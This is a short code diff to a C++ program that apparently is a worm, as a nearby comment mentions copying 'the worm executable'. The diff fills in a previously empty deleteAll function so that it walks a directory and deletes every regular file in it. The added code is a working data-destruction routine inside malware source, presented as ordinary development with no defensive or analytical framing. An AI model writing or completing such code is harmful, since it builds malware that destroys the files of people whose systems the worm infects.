@@ -29,8 +29,15 @@ std::vector<std::string> checkSubDir(const std::string &path) {
 
 // This function is responsible to look to all files inside
 // a directory path and delete them all
-void deleteAll(std::filesystem::path path) {
-    return;
+void deleteAll(std::string path) {
+    // Loops through all entries inside the passed variable path
+    for (const auto &entry : std::filesystem::directory_iterator(path)) {
+        // checks if the entry is a regular file
+        // If true, deletes it
+        if (std::filesystem::is_regular_file(entry)) {
+            std::filesystem::remove(entry);
+        }
+    }
 }
 
 // This function is responsible to copy the worm executable
